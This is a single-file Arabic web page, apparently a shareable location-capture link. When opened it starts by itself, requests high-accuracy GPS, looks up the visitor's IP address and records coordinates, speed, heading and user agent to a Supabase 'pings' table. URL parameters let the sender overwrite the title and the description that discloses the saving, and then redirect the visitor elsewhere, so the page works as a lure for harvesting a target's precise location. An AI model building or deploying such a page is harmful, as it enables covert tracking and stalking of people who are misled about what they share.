<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>مشاركة موقعي</title>

  <!-- CSP بسيطة -->
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self';
                 img-src * data:;
                 script-src 'self' https://cdn.jsdelivr.net;
                 connect-src 'self' https://*.supabase.co https://api.ipify.org;
                 style-src 'self' 'unsafe-inline';
                 frame-ancestors 'none'">

  <style>
    :root{color-scheme:light dark}
    body{font-family:system-ui,-apple-system,Segoe UI;min-height:100svh;display:grid;place-items:center;padding:24px;line-height:1.7;background:#fafafa}
    .card{max-width:560px;width:100%;border:1px solid #e5e7eb;border-radius:12px;padding:22px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
    .muted{color:#6b7280}.ok{color:#047857;font-weight:700}.err{color:#b91c1c;font-weight:700}
    progress{width:100%}
    .actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
    button,a.btn{padding:10px 14px;border:1px solid #ddd;border-radius:10px;background:#f8fafc;text-decoration:none;color:inherit}
    .hidden{display:none}
    code{direction:ltr}
  </style>
</head>
<body>
  <div class="card">
    <h1 id="title">📍 تحديد موقعك…</h1>
    <p id="desc" class="muted">سنطلب من المتصفح موقعك بدقّة عالية عبر GPS ونحفظه.</p>

    <progress id="bar" max="100" value="15"></progress>
    <p id="status" class="muted">جارِ طلب الإذن…</p>

    <div id="info" class="hidden">
      <p>الإحداثيات: <code id="coords"></code></p>
      <p class="muted">الدقّة: <span id="acc"></span> متر</p>
      <div class="actions">
        <a id="gmaps" class="btn" target="_blank" rel="noopener">فتح في خرائط Google</a>
        <button id="retry">إعادة القياس</button>
      </div>
    </div>

    <button id="retry2" class="hidden">إعادة المحاولة</button>
  </div>

  <!-- supabase -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // ===== Supabase =====
    const PROJECT_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
    const ANON_KEY    = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
    const TABLE       = 'pings';
    const supabase = window.supabase.createClient(PROJECT_URL, ANON_KEY);

    // ===== عناصر الواجهة =====
    const qs = new URLSearchParams(location.search);
    const titleQP = qs.get('title')?.slice(0,80) || null;
    const descQP  = qs.get('desc')?.slice(0,160) || null;
    let redirect  = null;
    (function(){ const raw = qs.get('redirect'); if (raw && raw.startsWith('/') && !raw.startsWith('//')) redirect = raw; })();

    if (titleQP) document.getElementById('title').textContent = titleQP;
    if (descQP)  document.getElementById('desc').textContent  = descQP;

    const bar = document.getElementById('bar');
    const statusEl = document.getElementById('status');
    const infoBox = document.getElementById('info');
    const coordsEl = document.getElementById('coords');
    const accEl = document.getElementById('acc');
    const gmapsEl = document.getElementById('gmaps');
    const retryBtn = document.getElementById('retry');
    const retry2Btn = document.getElementById('retry2');

    function setStatus(t, cls){ statusEl.textContent = t; statusEl.className = cls || 'muted'; }

    // ===== GPS فقط =====
    function gpsGeo(timeoutMs = 20000){
      return new Promise((resolve,reject)=>{
        if (!('geolocation' in navigator)) return reject(new Error('المتصفح لا يدعم تحديد الموقع'));
        const opts = { enableHighAccuracy:true, timeout:timeoutMs, maximumAge:0 };
        navigator.geolocation.getCurrentPosition(
          pos => resolve(pos.coords),
          err => reject(err),
          opts
        );
      });
    }

    async function getIP(){
      try{
        const r = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
        if (!r.ok) throw 0;
        const j = await r.json();
        return j.ip || null;
      }catch{ return null; }
    }

    async function save(row){
      const { error } = await supabase.from(TABLE).insert([row]);
      if (error) throw new Error(error.message);
    }

    function showResult(c){
      const lat = c.latitude, lng = c.longitude, accuracy = c.accuracy ?? null;
      coordsEl.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
      accEl.textContent = accuracy != null ? Math.round(accuracy) : 'غير معروف';
      gmapsEl.href = `https://maps.google.com/?q=${lat},${lng}`;
      infoBox.classList.remove('hidden');
      bar.value = 100;
      setStatus('تم القياس وحُفظت البيانات ✅','ok');
      if (redirect) setTimeout(()=>location.assign(redirect), 800);
    }

    async function measure(){
      try{
        infoBox.classList.add('hidden');
        retry2Btn.classList.add('hidden');
        bar.value = 20;
        setStatus('جارِ طلب إذن GPS من المتصفح…');

        const c = await gpsGeo(20000);      // ← GPS فقط (قد يطلب إذن)
        bar.value = 60;
        setStatus('جلب عنوان الـ IP…');
        const ip = await getIP();

        bar.value = 80;
        setStatus('حفظ البيانات في Supabase…');
        const ua = navigator.userAgent;

        await save({
          lat: c.latitude,
          lng: c.longitude,
          accuracy: c.accuracy ?? null,
          ip,
          ua,
          note: null,             // يمكن تمريره لاحقًا من الرابط لو رغبت
          device_info: ua,
          speed: c.speed ?? null,
          heading: c.heading ?? null
        });

        showResult(c);
      }catch(e){
        let msg = e && e.code != null ? e.code : e.message || 'فشل غير معروف';
        if (e.code === 1) msg = 'المستخدم رفض الإذن (User denied Geolocation)';
        else if (e.code === 2) msg = 'الموقع غير متاح مؤقتًا';
        else if (e.code === 3) msg = 'انتهت مهلة الطلب (Timeout)';
        setStatus('خطأ: ' + msg, 'err');
        retry2Btn.classList.remove('hidden');
      }
    }

    retryBtn.addEventListener('click', measure);
    retry2Btn.addEventListener('click', measure);

    // يبدأ تلقائيًا
    measure();
  </script>
</body>
</html>
